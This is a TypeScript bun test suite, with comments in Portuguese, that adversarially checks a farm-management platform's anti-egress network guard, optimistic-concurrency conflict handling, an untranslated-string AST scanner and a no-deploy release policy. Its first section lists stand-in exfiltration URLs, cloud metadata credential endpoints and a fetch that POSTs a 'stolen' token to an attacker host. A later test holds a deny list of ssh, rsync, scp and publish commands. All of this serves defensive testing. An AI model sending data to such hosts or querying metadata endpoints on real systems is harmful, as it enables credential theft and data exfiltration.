import { moduleSeedSnapshot } from '../harness/module-seed';
/**
 * SUÍTE ADVERSARIAL FINAL DO CHALLENGER — FASE 08 (MISSÃO F23-ISOLATED-NEXT)
 * Agente: challenger_f08_1 (Roles: critic, specialist)
 * Data: 2026-11-05
 * 
 * Desafios Hostis e Validações Empíricas Estritas:
 * 1. Ataques à barreira anti-egress de rede e tentativas de escape do monorepo:
 *    - Evasão de hostname (subdomínios falsificados contendo 127.0.0.1 ou localhost)
 *    - Acesso a IPs privados, portas não autorizadas, metadados de nuvem (169.254.169.254) e IPv6 não-loopback
 *    - Tentativas de contato com serviços de nuvem CONSUBOV (Supabase, Vercel, Cloudflare, Neon, produção)
 *    - Polimorfismo de chamada ao fetch (string, URL instance, Request object)
 *    - Tentativas estáticas de importação de código legado fora de next-platform/
 *    - Auditoria de confinamento absoluto do repositório canônico (HEAD/status/hashes/stashes observados antes e depois)
 * 2. Estresse hostil de concorrência e OCC 409 sem LWW destrutivo:
 *    - Disputa massiva: 50 comandos concorrentes de mutação física com base_version defasada acionam OCC 409
 *    - Concorrência massiva em cocho: 30 leituras simultâneas aplicam Merge Aditivo cronológico sem perda
 *    - Ciclo de resolução explícita: alternância rápida entre 'manter_local' (recalculando base_version) e 'aceitar_servidor'
 *    - Resiliência a comandos inexistentes, resoluções duplicadas e IDs forjados sem corrupção de estado
 * 3. Desafios sintéticos ao AST Literal Guard (casos limítrofes JSX e dicionário):
 *    - Desafio sintético com JSX aninhado profundo, fragmentos compostos e espaçamento extremo
 *    - Detecção de atributos sensíveis camuflados (placeholder, aria-label, alt, title, helperText)
 *    - Tolerância a literais permitidos, emojis, números, unidades e pontuação (zero falsos-positivos)
 *    - Resiliência a ataques ao dicionário: chaves inexistentes, prototype pollution (__proto__, toString)
 *    - Auditoria de simetria e densidade de 100% das mais de 650 chaves entre pt-BR e en-US
 * 4. Teste automatizado de auditoria da cláusula RELEASE_PROIBIDO_ESTRITAMENTE_NO_GO:
 *    - package.json da raiz com "private": true e ZERO scripts de publicação/deploy
 *    - Docs técnicos em next-platform/docs/ com cláusula explícita NO-GO / PRODUÇÃO ESTRITAMENTE NO-GO
 *    - Derivação pura do relatório; nenhuma homologação ou autorização de produção
 *    - Auditoria de remotos git impedindo push involuntário para produção
 */

import { describe, it, expect, beforeEach, afterEach, beforeAll, afterAll } from 'bun:test';
import { assertOnlyNextPlatformChanges, canonicalRepository, captureGitBaseline, captureSourceManifest, createOwnedQaDirectory, nextPlatformDir, readGit, worktreeDir } from '../harness/workspace-baseline';
import {
  existsSync,
  readFileSync,
  writeFileSync,
  statSync
} from 'fs';
import { resolve, join } from 'path';
import { createReport, Q8_LOCAL_CHECK_IDS, verdictForChecks, type Q8Check } from '../harness/q8-report';
import { installNetworkGuard, AntiEgressViolationError } from '../harness/network-guard';
import { scanAstLiterals, isViolatingLiteral } from '../harness/ast-literal-guard';
import { APP_DICTIONARY, translateKey } from '@consubov/contracts';
import {
  createSyntheticCommandEnvelope,
  atomicCommandEnvelopeSchema
} from '../harness/synthetic-data';
import {
  resolveDomainConflict,
  applyLocalResolution,
  isAdditiveDomainCommand,
  CapatazStore,
  resetCapatazStoresForTesting
} from '../../apps/fazenda/capataz/src';
import type { ModuleExecutionContext, ModuleLocalDataAPI, LocalSnapshot, LocalPendingCommand } from '@consubov/contracts';

const capatazTestPartitions = new Map<string, { snapshots: LocalSnapshot[]; commands: LocalPendingCommand[] }>();
function capatazTestContext(legacyKey: string): ModuleExecutionContext {
  const parts = legacyKey.split(':');
  if (parts[0] === 'consubov') parts.shift();
  const [tenantId, userId, farmId] = parts;
  if (!tenantId || !userId || !farmId) throw new Error(`Invalid test partition key: ${legacyKey}`);
  return { userId, tenantId, farmId, retreatId: null, moduleId: 'capataz', profileId: 'capataz', deviceId: 'device-challenger-test', productId: 'consubov' };
}
function newCapatazStore(legacyKey: string): CapatazStore {
  const context = capatazTestContext(legacyKey);
  const key = JSON.stringify([context.productId, context.moduleId, context.userId, context.tenantId, context.farmId, context.retreatId]);
  let partition = capatazTestPartitions.get(key);
  if (!partition) { partition = { snapshots: [moduleSeedSnapshot('capataz')], commands: [] }; capatazTestPartitions.set(key, partition); }
  const data: ModuleLocalDataAPI = {
    readSnapshot: async () => null,
    listSnapshots: async <T,>() => partition!.snapshots as LocalSnapshot<T>[],
    commitMutation: async mutation => {
      const index = partition!.snapshots.findIndex(snapshot => snapshot.aggregateType === mutation.snapshot.aggregateType && snapshot.aggregateId === mutation.snapshot.aggregateId);
      if (index >= 0) partition!.snapshots.splice(index, 1);
      partition!.snapshots.push(mutation.snapshot);
      partition!.commands.push({ command: mutation.command as unknown as LocalPendingCommand['command'], attachmentRefs: mutation.command.attachment_refs });
      return { commandId: mutation.command.command_id, committed: true };
    },
    readAttachment: async () => null,
    listPendingCommands: async limit => partition!.commands.slice(0, limit),
    getCursor: async () => null,
    getSchemaVersion: async () => 1
  };
  return new CapatazStore(context, data);
}

describe('CHALLENGER F08: Bateria Adversarial Empírica de Estresse e Encerramento da Incubação', () => {
  let canonicalBefore: ReturnType<typeof captureGitBaseline>;
  let worktreeBefore: ReturnType<typeof captureGitBaseline>;
  beforeAll(() => {
    canonicalBefore = captureGitBaseline(canonicalRepository());
    worktreeBefore = captureGitBaseline();
    assertOnlyNextPlatformChanges(worktreeBefore);
  });
  afterAll(() => {
    expect(captureGitBaseline(canonicalBefore.root)).toEqual(canonicalBefore);
    expect(captureGitBaseline()).toEqual(worktreeBefore);
  });

  let fixture: ReturnType<typeof createOwnedQaDirectory> | undefined;
  let uninstallNetworkGuard: (() => void) | null = null;

  beforeEach(() => {
    resetCapatazStoresForTesting();
    capatazTestPartitions.clear();
    if (typeof localStorage !== 'undefined') {
      localStorage.clear();
    }
  });

  afterEach(() => {
    if (uninstallNetworkGuard) {
      uninstallNetworkGuard();
      uninstallNetworkGuard = null;
    }
    fixture?.dispose();
    fixture = undefined;
  });

  // =========================================================================
  // VETOR 1: ATAQUES À BARREIRA ANTI-EGRESS E TENTATIVAS DE ESCAPE DO MONOREPO
  // =========================================================================
  describe('Vetor 1: Ataques à Barreira Anti-Egress de Rede e Tentativas de Escape do Monorepo', () => {
    it('ADV-8.1.1: Evasões de hostname com subdomínios e sufixos forjados contendo 127.0.0.1 ou localhost', async () => {
      uninstallNetworkGuard = installNetworkGuard();

      const hostileUrls = [
        'http://127.0.0.1.attacker.net/exfiltrate',
        'http://localhost.evil-domain.org/keys',
        'http://127.0.0.1-attacker.com:8080/leak',
        'https://localhost-fake-portal.com/auth',
        'http://attacker.com?mirror=127.0.0.1',
        'http://attacker.com#127.0.0.1',
        'http://evil.corp/127.0.0.1/steal'
      ];

      for (const url of hostileUrls) {
        let threwAntiEgress = false;
        try {
          await fetch(url);
        } catch (err) {
          if (err instanceof AntiEgressViolationError) {
            threwAntiEgress = true;
          }
        }
        expect(threwAntiEgress).toBe(true);
      }
    });

    it('ADV-8.1.2: Acesso hostil a IPs privados, redes internas, metadados de nuvem e IPv6 não-loopback', async () => {
      uninstallNetworkGuard = installNetworkGuard();

      const privateAndCloudUrls = [
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/', // AWS/OpenStack Metadata
        'http://169.254.169.254/computeMetadata/v1/', // GCP Metadata
        'http://10.0.0.1/admin/secrets', // RFC 1918 Class A
        'http://172.16.0.1:8080/internal', // RFC 1918 Class B
        'http://192.168.1.1/gateway.cfg', // RFC 1918 Class C
        'http://[2001:db8::1]:3000/api', // IPv6 externo
        'http://[fe80::1ff:fe23:4567:890a]/token' // IPv6 Link-Local
      ];

      for (const url of privateAndCloudUrls) {
        let threwAntiEgress = false;
        try {
          await fetch(url);
        } catch (err) {
          if (err instanceof AntiEgressViolationError) {
            threwAntiEgress = true;
          }
        }
        expect(threwAntiEgress).toBe(true);
      }
    });

    it('ADV-8.1.3: Bloqueio estrito e incondicional de endpoints de produção e serviços de nuvem CONSUBOV', async () => {
      uninstallNetworkGuard = installNetworkGuard();

      const productionUrls = [
        'https://consubov.supabase.co/rest/v1/health',
        'https://app.consubov.com.br/api/sync',
        'https://api.consubov.com.br/api/v1/commands',
        'https://consubov.com.br/baixar',
        'https://api.cloudflare.com/client/v4/zones',
        'https://console.neon.tech/api/v2/projects',
        'https://api.vercel.com/v1/deployments'
      ];

      for (const url of productionUrls) {
        let threwAntiEgress = false;
        try {
          await fetch(url);
        } catch (err) {
          if (err instanceof AntiEgressViolationError) {
            threwAntiEgress = true;
          }
        }
        expect(threwAntiEgress).toBe(true);
      }
    });

    it('ADV-8.1.4: Polimorfismo de chamada ao fetch (string, URL instance e Request object)', async () => {
      uninstallNetworkGuard = installNetworkGuard();

      // 1. Invocação via string primitiva
      let threwString = false;
      try {
        await fetch('https://adversary-exfil.com/raw');
      } catch (err) {
        if (err instanceof AntiEgressViolationError) threwString = true;
      }
      expect(threwString).toBe(true);

      // 2. Invocação via instância WHATWG URL
      let threwUrlInstance = false;
      try {
        await fetch(new URL('https://adversary-exfil.com/url-instance'));
      } catch (err) {
        if (err instanceof AntiEgressViolationError) threwUrlInstance = true;
      }
      expect(threwUrlInstance).toBe(true);

      // 3. Invocação via objeto Request com payload
      let threwRequestObj = false;
      try {
        const req = new Request('https://adversary-exfil.com/request-obj', {
          method: 'POST',
          body: JSON.stringify({ token: 'stolen' })
        });
        await fetch(req);
      } catch (err) {
        if (err instanceof AntiEgressViolationError) threwRequestObj = true;
      }
      expect(threwRequestObj).toBe(true);

      // 4. Invocação em hosts permitidos (127.0.0.1, localhost, ::1) NÃO deve disparar AntiEgressViolationError
      const allowedHosts = ['127.0.0.1', 'localhost', '::1'];
      for (const host of allowedHosts) {
        let threwAntiEgress = false;
        try {
          // Utiliza porta efêmera aleatória alta (vai falhar na conexão de rede normal, mas NÃO por anti-egress)
          await fetch(`http://${host}:59998/ping`);
        } catch (err) {
          if (err instanceof AntiEgressViolationError) {
            threwAntiEgress = true;
          }
        }
        expect(threwAntiEgress).toBe(false);
      }
    });

    it('ADV-8.1.5: Escape do monorepo: Hermeticidade estática e ausência de imports para código legado', () => {
      const allTsFiles = Object.keys(captureSourceManifest().files)
        .filter(path => /\.tsx?$/.test(path)).map(path => resolve(nextPlatformDir, path));
      expect(allTsFiles.length).toBeGreaterThan(30);

      const legacyEscapeViolations: Array<{ file: string; line: string }> = [];

      for (const file of allTsFiles) {
        const content = readFileSync(file, 'utf-8');
        const lines = content.split('\n');
        for (const line of lines) {
          if (/import\s+.*from\s+['"][^'"]+['"]/.test(line)) {
            // Proíbe importações relativas que naveguem para fora de next-platform
            if (
              line.includes('../../apps/web') ||
              line.includes('../../../apps/web') ||
              line.includes('../../../../apps/web') ||
              line.includes('../../../src/') ||
              line.includes('../../../../src/')
            ) {
              legacyEscapeViolations.push({ file, line });
            }
          }
        }
      }

      expect(legacyEscapeViolations).toEqual([]);
    });

    it('ADV-8.1.6: Escape do monorepo: Auditoria forense de confinamento absoluto do repositório canônico', () => {
      expect(captureGitBaseline(canonicalBefore.root)).toEqual(canonicalBefore);
      expect(captureGitBaseline()).toEqual(worktreeBefore);
      assertOnlyNextPlatformChanges();
    });
  });

  // =========================================================================
  // VETOR 2: ESTRESSE HOSTIL DE CONCORRÊNCIA E OCC 409 SEM LWW DESTRUTIVO
  // =========================================================================
  describe('Vetor 2: Estresse Hostil de Concorrência e OCC 409 sem LWW Destrutivo', () => {
    it('ADV-8.2.1: Disputa massiva: 50 comandos concorrentes de mutação física com base_version defasada acionam OCC 409', () => {
      const TOTAL_CONCURRENT = 50;
      const commands = [];

      for (let i = 0; i < TOTAL_CONCURRENT; i++) {
        commands.push({
          command_id: `cmd-occ-hostile-${i}`,
          idempotency_key: `idemp-occ-hostile-${i}-${Date.now()}`,
          command_type: 'gerente.lote.transferir_pasto',
          base_version: 1, // Versão informada pelo cliente
          occurred_at_local: new Date().toISOString(),
          tenant_id: 'tenant-adversarial',
          user_id: `user-operator-${i % 5}`,
          payload: {
            lote_id: `lote-${i}`,
            pasto_origem_id: 'pasto-norte',
            pasto_destino_id: 'pasto-sul',
            quantidade: 25 + i
          }
        });
      }

      // Executa resolução de conflito concorrente simulando retorno do servidor (versão atual = 5)
      const resolutions = commands.map((cmd) =>
        resolveDomainConflict(cmd as any, {
          statusCode: 409,
          serverAggregateVersion: 5,
          message: 'Versão do lote no servidor é 5, divergente de 1.'
        })
      );

      expect(resolutions.length).toBe(TOTAL_CONCURRENT);

      // Toda e qualquer mutação física DEVE resultar em OCC_CONFLICT_REVIEW e resolved === false (Anti-LWW)
      for (const res of resolutions) {
        expect(res.strategy).toBe('OCC_CONFLICT_REVIEW');
        expect(res.resolved).toBe(false);
        expect(res.message).toContain('Conflito OCC 409 detectado');
        expect(res.auditTrail.action).toBe('OCC_CONFLICT_DETECTED');
      }
    });

    it('ADV-8.2.2: Concorrência massiva em cocho: 30 leituras simultâneas aplicam Merge Aditivo cronológico sem perda', () => {
      const TOTAL_READINGS = 30;
      const existingServerObservations = [
        {
          pasto_id: 'pasto-central',
          escore_cocho: 2,
          sacos_fornecidos: 4,
          occurred_at_local: '2026-11-05T07:00:00.000Z',
          operador_id: 'user-madrugada'
        }
      ];

      const cochoCommands = [];
      for (let i = 0; i < TOTAL_READINGS; i++) {
        const minute = (i + 1).toString().padStart(2, '0');
        cochoCommands.push({
          command_id: `cmd-cocho-concorrente-${i}`,
          idempotency_key: `idemp-cocho-concorrente-${i}`,
          command_type: 'capataz.cocho.registrar_escore',
          base_version: 0,
          occurred_at_local: `2026-11-05T08:${minute}:00.000Z`,
          tenant_id: 'tenant-adversarial',
          user_id: `operador-campo-${i}`,
          payload: {
            pasto_id: 'pasto-central',
            produto_id: 'prod-sal-mineral-80',
            escore_cocho: (i % 5),
            sacos_fornecidos: (i % 3) + 1
          }
        });
      }

      // Conflito em leituras de campo DEVE aplicar ADDITIVE_MERGE
      for (let i = 0; i < TOTAL_READINGS; i++) {
        const resolution = resolveDomainConflict(cochoCommands[i] as any, {
          statusCode: 409,
          existingObservations: existingServerObservations
        });

        expect(resolution.strategy).toBe('ADDITIVE_MERGE');
        expect(resolution.resolved).toBe(true);
        expect(resolution.mergedPayload.event_stream.length).toBe(2); // Existente + Atual
        expect(resolution.mergedPayload.total_observations_count).toBe(2);
        expect(resolution.auditTrail.action).toBe('ADDITIVE_MERGE_APPLIED');
      }
    });

    it('ADV-8.2.3: Ciclo de resolução explícita: alternância rápida entre manter_local e aceitar_servidor', async () => {
      const store = newCapatazStore('consubov:tenant-adv-occ:user-01:fazenda-01:capataz');
      await store.ready;
      (store as any).state.isLeader = true;

      const TOTAL_ITEMS = 20;

      // Injeta 20 conflitos no estado
      for (let i = 0; i < TOTAL_ITEMS; i++) {
        (store as any).state.conflitos.push({
          command: {
            command_id: `cmd-conflito-alternado-${i}`,
            idempotency_key: `idemp-conflito-alternado-${i}`,
            command_type: 'gerente.lote.transferir_pasto',
            base_version: 1,
            payload: { lote_id: `lote-${i}`, pasto_id: `pasto-${i}` }
          },
          detectedAt: new Date().toISOString(),
          reason: 'Conflito de concorrência detectado (409)',
          serverVersion: 3 + i
        });
      }

      expect(store.getState().conflitos.length).toBe(TOTAL_ITEMS);

      // Itens pares -> manter_local (re-adiciona na outbox com base_version recalculada)
      // Itens ímpares -> aceitar_servidor (descarta a mutação local)
      for (let i = 0; i < TOTAL_ITEMS; i++) {
        const cmdId = `cmd-conflito-alternado-${i}`;
        if (i % 2 === 0) {
          store.resolverConflito(cmdId, 'manter_local');
        } else {
          store.resolverConflito(cmdId, 'aceitar_servidor');
        }
      }

      // Ao término, todos os conflitos foram processados
      expect(store.getState().conflitos.length).toBe(0);

      // Os 10 itens pares foram re-enfileirados na outbox com base_version recalculada (serverVersion + 1)
      const outbox = store.getState().outbox;
      expect(outbox.length).toBe(10);

      for (let i = 0; i < TOTAL_ITEMS; i += 2) {
        const cmdId = `cmd-conflito-alternado-${i}`;
        const found = outbox.find((c) => c.command_id === cmdId);
        expect(found).toBeDefined();
        expect(found!.base_version).toBe(3 + i + 1); // serverVersion + 1
        expect(found!.idempotency_key).toContain('recalc');
      }

      // Os 10 itens ímpares NÃO estão na outbox (foram descartados)
      for (let i = 1; i < TOTAL_ITEMS; i += 2) {
        const cmdId = `cmd-conflito-alternado-${i}`;
        const found = outbox.find((c) => c.command_id === cmdId);
        expect(found).toBeUndefined();
      }
    });

    it('ADV-8.2.4: Resiliência a comandos inexistentes, resoluções duplicadas e IDs forjados sem corrupção', async () => {
      const store = newCapatazStore('consubov:tenant-adv-occ-safe:user-01:fazenda-01:capataz');
      await store.ready;
      (store as any).state.isLeader = true;

      // 1. Tentar resolver um ID inexistente
      expect(() => {
        store.resolverConflito('cmd-inexistente-999', 'manter_local');
      }).not.toThrow();
      expect(store.getState().conflitos.length).toBe(0);
      expect(store.getState().outbox.length).toBe(0);

      // 2. Inserir um conflito legítimo
      (store as any).state.conflitos.push({
        command: {
          command_id: `cmd-legit-01`,
          idempotency_key: `idemp-legit-01`,
          command_type: 'gerente.lote.transferir_pasto',
          base_version: 1,
          payload: { lote_id: 'lote-x' }
        },
        detectedAt: new Date().toISOString(),
        reason: '409 Conflict',
        serverVersion: 2
      });

      // 3. Resolver primeira vez
      store.resolverConflito('cmd-legit-01', 'manter_local');
      expect(store.getState().conflitos.length).toBe(0);
      expect(store.getState().outbox.length).toBe(1);

      // 4. Tentar resolver novamente o mesmo ID (chamada duplicada / corrida)
      expect(() => {
        store.resolverConflito('cmd-legit-01', 'manter_local');
      }).not.toThrow();

      // A outbox não deve duplicar o comando
      expect(store.getState().outbox.length).toBe(1);
    });
  });

  // =========================================================================
  // VETOR 3: DESAFIOS SINTÉTICOS AO AST LITERAL GUARD (CASOS LIMÍTROFES JSX E DICIONÁRIO)
  // =========================================================================
  describe('Vetor 3: Desafios Sintéticos ao AST Literal Guard (Casos Limítrofes JSX e Dicionário)', () => {
    it('ADV-8.3.1: Desafio AST: Detecção de literais camuflados em JSX aninhado profundo, fragmentos e espaços', () => {
      fixture = createOwnedQaDirectory('q8-challenger');
      const tempFixtureDir = fixture.path;

      const hostileFixturePath = join(tempFixtureDir, 'hostile-nested.tsx');
      const hostileCode = `
import React from 'react';

export function HostileComponent() {
  return (
    <>
      <div>
        <section>
          <article>
            <p>
              <span>
                <strong>Texto Oculto e Profundo Não Traduzido</strong>
              </span>
            </p>
          </article>
        </section>
      </div>
      <>
        <span>Fragmento Duplo com String Hardcoded</span>
      </>
      <div>
        \\n\\t\\r   String com Espaçamento e Quebras de Linha   \\t\\r\\n
      </div>
    </>
  );
}
`;
      writeFileSync(hostileFixturePath, hostileCode, 'utf-8');

      const violations = scanAstLiterals(hostileFixturePath);
      expect(violations.length).toBeGreaterThanOrEqual(3);

      const texts = violations.map((v) => v.text);
      expect(texts.some((t) => t.includes('Texto Oculto e Profundo'))).toBe(true);
      expect(texts.some((t) => t.includes('Fragmento Duplo'))).toBe(true);
      expect(texts.some((t) => t.includes('String com Espaçamento'))).toBe(true);
    });

    it('ADV-8.3.2: Desafio AST: Detecção de literais hardcoded em expressões e atributos sensíveis camuflados', () => {
      fixture = createOwnedQaDirectory('q8-challenger');
      const tempFixtureDir = fixture.path;

      const hostileAttrsFixturePath = join(tempFixtureDir, 'hostile-attributes.tsx');
      const hostileAttrsCode = `
import React from 'react';

export function HostileAttributesComponent() {
  return (
    <div>
      <input placeholder="Digite o identificador do lote..." />
      <button aria-label="Confirmar exclusão permanente de animal">OK</button>
      <img alt="Fotografia do cocho número quatro" src="/cocho.jpg" />
      <div title="Tooltip informativo sem suporte bilingue">Info</div>
      <span aria-description="Descrição de acessibilidade sem tradução">Desc</span>
      <div helperText="Mensagem de ajuda obrigatória" />
      <div>{'String Literais Direta em Chaves Sem t()'}</div>
    </div>
  );
}
`;
      writeFileSync(hostileAttrsFixturePath, hostileAttrsCode, 'utf-8');

      const violations = scanAstLiterals(hostileAttrsFixturePath);
      expect(violations.length).toBeGreaterThanOrEqual(7);

      const kinds = violations.map((v) => v.kind);
      expect(kinds).toContain('JsxAttribute');
      expect(kinds).toContain('JsxExpression');

      const attrNames = violations.filter((v) => v.kind === 'JsxAttribute').map((v) => v.attributeName);
      expect(attrNames).toContain('placeholder');
      expect(attrNames).toContain('aria-label');
      expect(attrNames).toContain('alt');
      expect(attrNames).toContain('title');
      expect(attrNames).toContain('helperText');
    });

    it('ADV-8.3.3: Desafio AST: Tolerância estrita a símbolos permitidos, emojis, números e unidades (zero falsos-positivos)', () => {
      fixture = createOwnedQaDirectory('q8-challenger');
      const tempFixtureDir = fixture.path;

      const safeFixturePath = join(tempFixtureDir, 'safe-tokens.tsx');
      const safeCode = `
import React from 'react';

export function SafeTokensComponent() {
  return (
    <div>
      <div>CONSUBOV</div>
      <div>••••••••</div>
      <div>🇧🇷 Português</div>
      <div>🇺🇸 English</div>
      <div>🐂 ⚠️ ⚖️ 🐄 📦</div>
      <div>1234567890</div>
      <div>450</div>
      <div>$ 100.00</div>
      <div>25.5 %</div>
      <div>- / : % #</div>
      <div>A</div>
      <div> </div>
    </div>
  );
}
`;
      writeFileSync(safeFixturePath, safeCode, 'utf-8');

      const violations = scanAstLiterals(safeFixturePath);
      // Nenhum dos tokens seguros deve ser considerado violação
      expect(violations.length).toBe(0);
    });

    it('ADV-8.3.4: Resiliência do dicionário: Prototype Pollution, chaves inexistentes e locales inválidos', () => {
      // 1. Prototype pollution com '__proto__' ou 'toString'
      const protoRes = translateKey('pt-BR', '__proto__');
      expect(typeof protoRes).toBe('string');
      expect(protoRes).toBe('__proto__'); // Não deve retornar Object.prototype

      const toStringRes = translateKey('pt-BR', 'toString');
      expect(typeof toStringRes).toBe('string');
      expect(toStringRes).toBe('toString'); // Não deve retornar Function: toString

      const valueOfRes = translateKey('pt-BR', 'valueOf');
      expect(typeof valueOfRes).toBe('string');
      expect(valueOfRes).toBe('valueOf');

      // 2. Chave inexistente deve retornar a própria chave como fallback seguro sem crash
      const nonExistentKey = 'chave.absolutamente.inexistente.no.sistema.123';
      const fallbackPt = translateKey('pt-BR', nonExistentKey);
      const fallbackEn = translateKey('en-US', nonExistentKey);
      expect(fallbackPt).toBe(nonExistentKey);
      expect(fallbackEn).toBe(nonExistentKey);

      // 3. Idioma não suportado deve recorrer ao fallback sem quebrar a execução
      const invalidLocale = 'es-ES' as any;
      const resInvalid = translateKey(invalidLocale, 'app.name');
      expect(typeof resInvalid).toBe('string');
      expect(resInvalid.length).toBeGreaterThan(0);
    });

    it('ADV-8.3.5: Auditoria exaustiva de simetria e densidade do dicionário canônico APP_DICTIONARY', () => {
      const ptDict = APP_DICTIONARY['pt-BR'];
      const enDict = APP_DICTIONARY['en-US'];

      const ptKeys = Object.keys(ptDict).sort();
      const enKeys = Object.keys(enDict).sort();

      // Mais de 600 chaves traduzidas em cada idioma
      expect(ptKeys.length).toBeGreaterThanOrEqual(600);
      expect(enKeys.length).toBeGreaterThanOrEqual(600);
      expect(ptKeys.length).toBe(enKeys.length);

      // Simetria matemática de 100%
      const missingInEn = ptKeys.filter((k) => !enDict[k]);
      const missingInPt = enKeys.filter((k) => !ptDict[k]);
      expect(missingInEn).toEqual([]);
      expect(missingInPt).toEqual([]);

      // Zero placeholders vazios ou TODOs
      for (const key of ptKeys) {
        const ptVal = ptDict[key]?.trim();
        const enVal = enDict[key]?.trim();

        expect(ptVal).toBeDefined();
        expect(ptVal!.length).toBeGreaterThan(0);
        expect(ptVal).not.toBe('TODO');
        expect(ptVal).not.toBe('TBD');
        expect(ptVal).not.toBe('FIXME');

        expect(enVal).toBeDefined();
        expect(enVal!.length).toBeGreaterThan(0);
        expect(enVal).not.toBe('TODO');
        expect(enVal).not.toBe('TBD');
        expect(enVal).not.toBe('FIXME');
      }
    });
  });

  // =========================================================================
  // VETOR 4: AUDITORIA AUTOMATIZADA DA CLÁUSULA RELEASE_PROIBIDO_ESTRITAMENTE_NO_GO
  // =========================================================================
  describe('Vetor 4: Auditoria da Cláusula RELEASE_PROIBIDO_ESTRITAMENTE_NO_GO nos Docs e Package.json', () => {
    it('ADV-8.4.1: Auditoria do package.json: "private": true e ausência de scripts de publicação/deploy externo', () => {
      const pkgPath = resolve(nextPlatformDir, 'package.json');
      expect(existsSync(pkgPath)).toBe(true);

      const pkg = JSON.parse(readFileSync(pkgPath, 'utf-8'));

      // A raiz DEVE ser estritamente privada contra publicação pública acidental
      expect(pkg.private).toBe(true);

      // Auditoria de scripts: NENHUM script deve permitir deploy, publish ou push remoto para VPS/produção
      const scripts = pkg.scripts || {};
      const scriptNames = Object.keys(scripts);

      const forbiddenKeywords = ['publish', 'deploy', 'release:prod', 'push:remote', 'vps:deploy'];
      for (const name of scriptNames) {
        for (const kw of forbiddenKeywords) {
          expect(name.toLowerCase().includes(kw)).toBe(false);
        }
      }

      // Nenhum comando dentro dos scripts pode conter curl, ssh ou rsync para servidores remotos
      for (const [name, cmd] of Object.entries<string>(scripts)) {
        expect(cmd).not.toContain('ssh ');
        expect(cmd).not.toContain('rsync ');
        expect(cmd).not.toContain('scp ');
        expect(cmd).not.toContain('vercel --prod');
        expect(cmd).not.toContain('wrangler deploy');
        expect(cmd).not.toContain('npm publish');
        expect(cmd).not.toContain('bun publish');
      }
    });

    it('ADV-8.4.2: Auditoria dos documentos técnicos em next-platform/docs/ com cláusula NO-GO explícita', () => {
      const docsDir = resolve(nextPlatformDir, 'docs');
      expect(existsSync(docsDir)).toBe(true);

      const requiredDocs = [
        'f08-arquitetura-plataforma-isolada.md',
        'f08-guia-operacao-offgrid-capataz.md',
        'f08-relatorio-encerramento-incubacao.md'
      ];

      for (const docFile of requiredDocs) {
        const docPath = resolve(docsDir, docFile);
        expect(existsSync(docPath)).toBe(true);

        const stat = statSync(docPath);
        // Cada documento técnico deve ser substantivo (> 5.000 bytes)
        expect(stat.size).toBeGreaterThanOrEqual(5000);

        const content = readFileSync(docPath, 'utf-8');
        // Não deve conter marcadores de placeholder não resolvidos
        expect(content).not.toContain('TODO:');
        expect(content).not.toContain('[INSERIR_CONTEUDO]');
      }

      // O relatório executivo de encerramento e o documento arquitetural DEVEM conter a salvaguarda NO-GO
      const relatorioContent = readFileSync(resolve(docsDir, 'f08-relatorio-encerramento-incubacao.md'), 'utf-8');
      expect(relatorioContent).toContain('NO-GO');
      expect(relatorioContent).toContain('PRODUÇÃO ESTRITAMENTE NO-GO');
      expect(relatorioContent).toContain('DEV LOCAL READY');

      const arqContent = readFileSync(resolve(docsDir, 'f08-arquitetura-plataforma-isolada.md'), 'utf-8');
      expect(arqContent).toContain('PRODUÇÃO ESTRITAMENTE NO-GO');
    });

    it('ADV-8.4.3: Relatório puro deriva falhas e pendências sem recibo anterior', () => {
      const identity = { root: '/synthetic/worktree', head: 'a'.repeat(40), branch: '(detached)', dirty: true, changedFileHashes: { 'next-platform/example.ts': 'bytes' }, stashSha256: 'stash-digest' };
      const source = { files: { 'example.ts': 'bytes' }, sha256: 'manifest', exclusions: [] };
      const checks: Q8Check[] = Q8_LOCAL_CHECK_IDS.map(id => ({ id, name: id, status: 'PASS', duration_ms: 1 }));
      const input = { runId: 'synthetic-report-unit', startedAt: '2026-11-05T00:00:00Z', finishedAt: '2026-11-05T00:00:01Z', baseline: identity, finalBaseline: identity, canonicalBefore: identity, canonicalAfter: identity, sourceBefore: source, sourceAfter: source, checks };
      const report = createReport({ ...input, checks: [...checks, { id: 'REAL_BROWSER', name: 'independent real browser evidence', status: 'NAO_EXECUTADO', duration_ms: 0 }] });
      expect(report.localGateVerdict).toBe('PASS');
      expect(report.verdict).toBe('NAO_EXECUTADO');
      expect(report.audit_flags.closure_status).toBe('HOMOLOGACAO_PENDENTE');
      expect(report.audit_flags.production_gate).toBe('NO_GO');
      expect(report.summary.not_executed).toBe(1);
      const failed = createReport({ ...input, checks: checks.map(check => check.id === 'Q8.5_HERMETIC_SECURITY_ANTI_EGRESS' ? { ...check, status: 'FAIL' as const } : check) });
      expect(failed.verdict).toBe('FAIL');
      expect(failed.audit_flags.isolation_preserved).toBe(false);
      expect(verdictForChecks([])).toBe('NAO_EXECUTADO');
      expect(createReport({ ...input, checks: [] }).localGateVerdict).toBe('NAO_EXECUTADO');
      expect(createReport({ ...input, sourceAfter: { ...source, files: { 'example.ts': 'changed-dirty-bytes' } } }).localGateVerdict).toBe('BLOQUEADO');
      expect(createReport({ ...input, canonicalAfter: { ...identity, stashSha256: 'different-same-count' } }).audit_flags.canonical_repo_untouched).toBe(false);
    });

    it('ADV-8.4.4: Auditoria de remotos Git somente leitura e identidade observada', () => {
      expect(captureGitBaseline()).toEqual(worktreeBefore);

      // 2. Os remotos git NÃO devem apontar para repositórios de deploy ou produção de terceiros
      const remotes = readGit(worktreeDir, ['remote', '-v']);
      expect(remotes).not.toContain('vps');
      expect(remotes).not.toContain('production');
      expect(remotes).not.toContain('vercel.com');
      expect(remotes).not.toContain('cloudflare.com');
    });
  });
});
